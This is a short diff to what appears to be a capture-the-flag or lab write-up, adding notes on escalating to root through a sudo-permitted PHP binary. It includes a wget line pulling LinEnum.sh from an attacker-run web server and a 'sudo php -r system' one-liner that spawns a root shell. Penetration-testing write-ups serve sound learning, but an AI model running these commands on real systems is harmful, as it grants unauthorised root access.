@@ -143,6 +143,17 @@ Kept getting errors when we tried to transfer the LinEnum.sh script over
 Finally worked when we ran the following command in the /var/www/html/theme directory:
 wget http://10.10.16.75/LinEnum.sh      (after we started a web server in our local Linux Enumeration Script folder)
 
+----
+
+FROM THE LINENUM SCAN RESULTS WE CAN SEE THAT WE CAN RUN PHP AS SUDO
+
+CMD="/bin/sh"
+sudo php -r "system('$CMD');"
+
+
+WE GOT ROOT
+
+
 
 
 
